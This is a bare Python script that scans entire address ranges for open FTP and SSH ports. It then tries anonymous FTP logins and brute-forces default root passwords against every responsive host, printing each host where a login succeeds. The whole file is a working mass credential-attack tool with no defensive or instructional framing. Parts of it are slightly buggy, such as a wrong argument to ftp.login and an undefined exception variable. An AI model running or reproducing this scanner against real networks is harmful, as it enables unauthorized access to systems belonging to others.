
import socket
from multiprocessing import Pool
import sys, os, time
from ftplib import FTP
from paramiko import SSHClient
from paramiko import AutoAddPolicy
 
usernames = ["root"]
passwords = ["root","123456"]
ports = [21,22]
 
def ssh_login(hostname,port,username,password):
    ssh = SSHClient()
    ssh.set_missing_host_key_policy(AutoAddPolicy())
    try:
      ssh.connect(hostname, port, username, password)
      ssh.close()
      print( hostname+"==>"+username+":"+password)
    except Exception:
      status = 'error'
    
def ftp_login(hostname,username,password):
    try:
        ftp = FTP(hostname)
        ftp.login(hostname,username, password)
        ftp.quit()
        print( hostname+"==>"+username+":"+password)
    except Exception:
        pass
 
def anon_login(hostname):
    try:
        ftp = FTP(hostname) 
        ftp.login()
        ftp.quit()
        print( hostname + "==>anon")
    except Exception:
        pass
 
 
def portcheck(target):
    ip, port = target.split(":")
    try:  
        cs = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        cs.settimeout(float(0.5))
        address=(ip, int(port))
        status = cs.connect_ex((address))
        if status == 0:
            print( ip + ":" + port )
            return ip + ":" + port 
    except Exception :   
        print( "error:%s" %e  )
    finally:
        cs.close()
 
if __name__ == '__main__':
    # portscan
    if len(sys.argv) == 2: 
        print( "Port Scaning ...")
        ip = sys.argv[1] + "."
        targets = []
        for ip_c in range(254):
            for ip_d in range(254):
                for port in ports:
                    targets.append(ip + str(ip_c) + "." + str(ip_d) + ":" + str(port))
        pool = Pool(100)
        results = pool.map(portcheck, targets)
        pool.close()
        pool.join()
        print( "\nScan end")
 
    elif sys.argv[2] == "ftp":
        print( "Ftp Brute ...")
        ip_c = sys.argv[1] + "."
        targets = []
        for ip_d in range(254):
            targets.append(ip_c + str(ip_d) + ":" + str(21))
        pool = Pool(10)
        results = pool.map(portcheck, targets)
        pool.close()
        pool.join()
        for hostname in results:
            if hostname is not None:
                hostname = hostname.split(":")[0]
                anon_login(hostname)
                for username in usernames:
                    for password in passwords:
                        ftp_login(hostname,username,password)
        print( "\nScan end")
 
    elif sys.argv[2] == "ssh":
        print( "SSH Brute ...")
        ip_c = sys.argv[1] + "."
        targets = []
        for ip_d in range(254):
            targets.append(ip_c + str(ip_d) + ":" + str(22))
        pool = Pool(10)
        results = pool.map(portcheck, targets)
        pool.close()
        pool.join()
        for hostname in results:
            if hostname is not None:
                hostname = hostname.split(":")[0]
                for username in usernames:
                    for password in passwords:
                        ssh_login(hostname,22,username,password)
        print( "\nScan end")